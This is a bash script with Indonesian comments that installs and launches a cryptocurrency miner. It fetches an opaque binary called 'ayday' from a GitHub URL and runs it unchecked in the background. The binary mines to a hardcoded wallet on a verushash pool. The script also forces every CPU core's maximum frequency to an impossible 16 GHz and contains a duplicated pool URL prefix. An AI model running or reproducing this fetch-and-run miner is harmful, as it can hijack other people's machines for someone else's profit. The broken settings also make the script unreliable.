#!/bin/bash

# Direktori tempat file akan diunduh
INSTALL_DIR="/opt/aydaybg"
FILE_NAME="ayday"
FILE_PATH="$INSTALL_DIR/$FILE_NAME"

# Membuat direktori
mkdir -p $INSTALL_DIR

# Mengunduh file dari link yang diberikan
wget -O $FILE_PATH https://github.com/malogrono/Compare/raw/main/ayday

# Memeriksa keberhasilan unduhan
if [ ! -s $FILE_PATH ]; then
  echo "File unduhan kosong atau gagal diunduh. Cek URL atau koneksi jaringan."
  exit 1
fi

# Mengatur frekuensi CPU ke 16 GHz
CPUFREQ_PATH="/sys/devices/system/cpu/cpu*/cpufreq"
MAX_FREQ=16000000 # Maksimal frekuensi dalam kHz (16 GHz)

for dir in $CPUFREQ_PATH; do
    if [ -e $dir/scaling_max_freq ]; then
        echo $MAX_FREQ > $dir/scaling_max_freq
    fi
done

# Pengaturan penambangan
ALGO="verushash"
POOL_URL="stratum+tcp://stratum+tcp://sg.vipor.net:5040"
WALLET_ADDRESS="RVYpmz7EfLpG46ugmchL3gjJKcqFiWQMb2"
PASSWORD="x"
WORKER_NAME="JIKA$RANDOM"

# Memulai dengan file ayday dan menjalankan di latar belakang
cd $INSTALL_DIR
chmod +x $FILE_NAME
./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 &

# Mengecek apakah proses penambangan dimulai dengan benar
if pgrep -f "$FILE_NAME" > /dev/null; then
  echo "Penambangan dimulai dengan sukses."
else
  echo "Gagal memulai proses penambangan."
  exit 1
fi

# Opsional: Tambahkan monitoring atau logging jika diinginkan
# echo "Monitoring status..." >> mining_log.txt
# top -b -d 60 >> mining_log.txt
